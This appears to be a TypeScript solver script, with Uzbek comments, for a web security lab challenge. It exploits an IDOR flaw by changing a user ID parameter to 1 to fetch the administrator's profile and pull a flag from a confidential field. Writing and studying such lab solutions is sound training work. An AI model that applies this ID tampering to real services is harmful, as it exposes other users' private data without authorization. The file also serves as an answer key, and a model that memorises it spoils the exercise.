/**
 * Yechim izohi:
 * Talaba o'z profiliga (/api/user?id=104) kirish o'rniga, ID parametrini o'zgartirib
 * administrator kabinetiga (/api/user?id=1) ruxsatsiz so'rov yuboradi (IDOR zaifligi).
 * JSON javobidagi 'confidential_note' maydonidan flag olinadi.
 */
import { withWebLabInstance, extractFlagFromText } from "./solver-utils";

export async function solve(options?: { userId?: string }): Promise<string> {
  const userId = options?.userId || "student_solver_test";

  return withWebLabInstance("web-idor", userId, async (baseUrl) => {
    const res = await fetch(`${baseUrl}/api/user?id=1`);
    const data = await res.json();
    const flag = extractFlagFromText(JSON.stringify(data));
    if (!flag) throw new Error("web-idor: Admin profilidan IDOR orqali flag topilmadi");
    return flag;
  });
}

if (require.main === module) {
  solve().then((f) => console.log("[SOLVER SUCCESS] web-idor flag:", f));
}
